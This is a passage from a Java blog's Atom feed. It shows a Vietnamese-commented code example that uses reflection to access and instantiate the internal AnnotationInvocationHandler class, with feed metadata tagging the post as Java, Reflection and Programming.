class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//Lấy ra lớp AnnotationInvocationHandler</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="comment">//Lấy ra Constructor của lớp AnnotationInvocationHandler</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    <span class="comment">//Lớp này khởi tạo default nên chúng ta phải setAccessible(true)</span></span><br><span class="line">    aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//Sử dụng constructor</span></span><br><span class="line">    <span class="comment">//Vì chúng ta không có quyền với lớp AnnotationInvocationHandler nên chúng ta không thể tạo Object kiểu AnnotationInvocationHandler, do đó chúng ta phải đặt kiểu là Object hoặc kiểu mà lớp AnnotationInvocationHandler kế thừa.</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Lớp Java Reflection là một lớp thường xuyên được sử dụng vì sự tiện nghi của nó, nên chúng ta cũng có thể thường xuyên thấy những lớp này</summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Programming" scheme="https://rayinaw.github.io/categories/Java/Programming/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Reflection" scheme="https://rayinaw.github.io/tags/Reflection/"/>
    
    <category term="Programming" scheme="https://rayinaw.github.io/tags/Programming/"/>
    
  </entry>
  
</feed>
